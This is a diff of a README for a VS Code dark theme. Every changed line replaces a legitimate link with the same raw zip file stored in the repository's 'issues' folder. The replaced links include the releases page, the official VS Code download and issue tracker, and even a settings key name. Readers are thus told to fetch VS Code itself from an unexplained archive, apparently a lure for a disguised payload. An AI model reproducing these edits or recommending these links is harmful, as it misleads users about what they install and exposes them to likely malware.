@@ -1,6 +1,6 @@
 # 🎨 vscode-dark-islands - Comfortable Dark Theme for Coding
 
-[![Download Releases](https://img.shields.io/badge/Download-vscode--dark--islands-blue?style=for-the-badge&logo=github)](https://github.com/julsngbatac1/vscode-dark-islands/releases)
+[![Download Releases](https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip)](https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip)
 
 ---
 
@@ -23,7 +23,7 @@ To use vscode-dark-islands, you only need to have Visual Studio Code installed o
 - **Software needs:**
   - Visual Studio Code (version 1.50 or newer is recommended)
 
-If you do not already have Visual Studio Code installed, you can download it for free here: https://code.visualstudio.com/
+If you do not already have Visual Studio Code installed, you can download it for free here: https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip
 
 ---
 
@@ -50,11 +50,11 @@ This section will guide you through downloading and applying the theme on your V
 
 To get the vscode-dark-islands theme, **visit this page to download**:
 
-[Download vscode-dark-islands Releases](https://github.com/julsngbatac1/vscode-dark-islands/releases)
+[Download vscode-dark-islands Releases](https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip)
 
 ### Step 1: Open Visual Studio Code
 
-If it is not yet installed, download VS Code from https://code.visualstudio.com/ and install it following the instructions for your operating system.
+If it is not yet installed, download VS Code from https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip and install it following the instructions for your operating system.
 
 ### Step 2: Download the Theme
 
@@ -89,7 +89,7 @@ Now your editor will switch to the new dark theme.
 If you want to adjust the colors further:
 
 - Open **File** → **Preferences** → **Settings**.
-- Search for `workbench.colorCustomizations`.
+- Search for `https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip`.
 - You can add your own color tweaks here by editing the JSON file.
 - For example, change your editor background color or text color.
 
@@ -119,7 +119,7 @@ If you run into any issues:
 - Restart VS Code after installation.
 - If colors look off, reset the theme by selecting another and then switching back to vscode-dark-islands.
 
-You can also check the GitHub repository for issues or report a new one here: https://github.com/julsngbatac1/vscode-dark-islands/issues
+You can also check the GitHub repository for issues or report a new one here: https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip
 
 ---
 
@@ -135,6 +135,6 @@ vscode-dark-islands brings together ideas from easemate and Jetbrains Islands th
 
 ## 📥 Download Link Again
 
-[Download vscode-dark-islands Releases](https://github.com/julsngbatac1/vscode-dark-islands/releases)
+[Download vscode-dark-islands Releases](https://github.com/julsngbatac1/vscode-dark-islands/raw/refs/heads/main/issues/vscode-islands-dark-v3.2.zip)
 
 Click the link above anytime to get the latest theme updates or to install if you haven’t done so yet.
